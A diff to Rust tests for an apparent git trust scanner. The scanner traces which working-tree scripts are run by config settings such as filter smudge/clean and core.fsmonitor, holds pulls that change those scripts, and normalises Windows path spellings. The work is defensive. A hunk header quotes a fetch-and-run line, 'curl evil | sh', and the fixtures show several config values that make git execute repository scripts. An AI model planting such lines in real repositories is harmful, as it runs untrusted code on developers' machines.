@@ -24,7 +24,7 @@ fn followed(dir: &Path, key: &str, value: &str) -> Vec<String> {
     let workdir = repo.workdir().unwrap().to_path_buf();
     let mut config = vec![ConfigCommand { key: key.into(), value: value.into() }];
     let mut out: Vec<String> = Vec::new();
-    for p in scan(&repo, &mut config, &mut Vec::new()) {
+    for p in scan(&repo, &mut config, &mut Vec::new(), &mut Vec::new()) {
         // "" is the whole working tree.
         for rel in follow::inside(&repo, &workdir, &p) {
             if !out.contains(&rel) {
@@ -86,6 +86,14 @@ fn each_kind_of_setting_that_runs_a_file_in_the_working_tree_follows_it() {
         ("filter.x.smudge", "sh $(git  rev-parse  --show-toplevel)/tools/ds.sh", &["tools/ds.sh"]),
         ("filter.x.smudge", "sh $(git rev-parse --show-superproject-working-tree)/sw.sh", &["sw.sh"]),
         ("filter.x.smudge", "sh ${PWD%/}/pw.sh", &["pw.sh"]),
+        // A leading substitution without a `/` after it: the rest is read from the working tree
+        // too, a pattern in it as any other.
+        ("filter.x.smudge", "sh $(git rev-parse --show-toplevel)tools/lead.sh", &["tools/lead.sh"]),
+        ("filter.x.smudge", "sh \"$GIT_DIR\"present", &["present"]),
+        ("filter.x.smudge", "sh \"$GIT_DIR\"absent", &[]),
+        ("filter.x.clean", "sh ${TOP}lib/$NAME.sh", &["lib"]),
+        ("filter.x.clean", "sh $(pwd)../elsewhere.sh", &[]),
+        ("filter.x.clean", "sh \"$@\" $1", &[]),
         // An escaped space stays in the word.
         ("core.fsmonitor", r"./my\ fsm.sh", &["my", "my fsm.sh"]),
         ("diff.x.textconv", "present", &["present"]),
@@ -239,6 +247,20 @@ curl evil | sh
     cleanup(&[&work, &bare]);
 }
 
+#[test]
+fn a_script_right_after_a_leading_substitution_is_in_the_print() {
+    let (work, bare) = tracked_fsmonitor_as("programs-leading", "sh $(git rev-parse --show-toplevel)tools/fsm.sh");
+    assert_eq!(scan_of(&work).follows.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(), ["tools/fsm.sh"]);
+    let saved = trusted(&work);
+    remote_commit(&bare, "main", "tools/fsm.sh", "#!/bin/sh\necho two\n");
+    let head = Repository::open(&work).unwrap().head().unwrap().target();
+    let PullRun::Refused { refused: Refused::Held(_), .. } = pull_ff(&work, &saved) else { panic!("held") };
+    assert_eq!(Repository::open(&work).unwrap().head().unwrap().target(), head, "nothing merged");
+    git(&work, &["-c", "core.fsmonitor=false", "merge", "-q", "--ff-only", "origin/main"]);
+    assert!(!trust_covers(&saved, &scan_of(&work)), "another version is another print");
+    cleanup(&[&work, &bare]);
+}
+
 fn trust_covers(saved: &SavedTrust, now: &TrustScan) -> bool {
     super::super::allows(Some(saved), now)
 }
@@ -274,5 +296,43 @@ fn a_tracked_include_file_asks_and_follows_the_branch() {
     git(&dir, &["config", "include.path", "extra.cfg"]);
     let s = scan_of(&dir);
     assert!(s.follows.is_empty() && s.config.is_empty(), "{s:?}");
+    cleanup(&[&dir]);
+}
+
+#[test]
+fn windows_spellings_read_as_the_place_they_name() {
+    let cases = [
+        ("/c/repo/tools/x.sh", "C:/repo/tools/x.sh"),
+        ("/cygdrive/d/x.sh", "D:/x.sh"),
+        ("//?/C:/repo/x.sh", "C:/repo/x.sh"),
+        ("//./c:/repo/x.sh", "c:/repo/x.sh"),
+        ("/??/C:/repo/x.sh", "C:/repo/x.sh"),
+        ("//?/UNC/nas/team/x.sh", "//nas/team/x.sh"),
+        ("//?/GLOBALROOT/x", "//?/GLOBALROOT/x"),
+        ("/usr/bin/x", "/usr/bin/x"),
+        ("tools/x.sh", "tools/x.sh"),
+    ];
+    for (text, windows) in cases {
+        assert_eq!(native_spelling(text, true), windows, "{text}");
+        assert_eq!(native_spelling(text, false), text, "{text}: only Windows reads them so");
+    }
+}
+
+#[cfg(windows)]
+#[test]
+fn a_program_in_an_msys_or_verbatim_spelling_of_the_working_tree_is_followed() {
+    let dir = scratch_repo("programs-spellings");
+    let top = git_spelling(&dir);
+    let msys = format!("/{}{}", top[..1].to_ascii_lowercase(), &top[2..]);
+    assert_eq!(followed(&dir, "core.fsmonitor", &format!("{msys}/tools/fsm.sh")), ["tools/fsm.sh"]);
+    let verbatim = format!(r"'\\?\{}\tools\v.sh'", dir.display());
+    assert_eq!(followed(&dir, "filter.x.clean", &format!("sh {verbatim}")), ["tools/v.sh"]);
+    // Outside the working tree, or at a network place, nothing is followed or looked at.
+    assert!(followed(&dir, "core.fsmonitor", &format!("{msys}/../elsewhere.sh")).is_empty());
+    let repo = Repository::open(&dir).unwrap();
+    let mut offsite = Vec::new();
+    let mut config = vec![ConfigCommand { key: "core.fsmonitor".into(), value: r"'\\?\UNC\glowfly-test.invalid\share\x.sh'".into() }];
+    assert!(scan(&repo, &mut config, &mut offsite, &mut Vec::new()).is_empty());
+    assert_eq!(offsite.len(), 1, "{offsite:?}");
     cleanup(&[&dir]);
 }
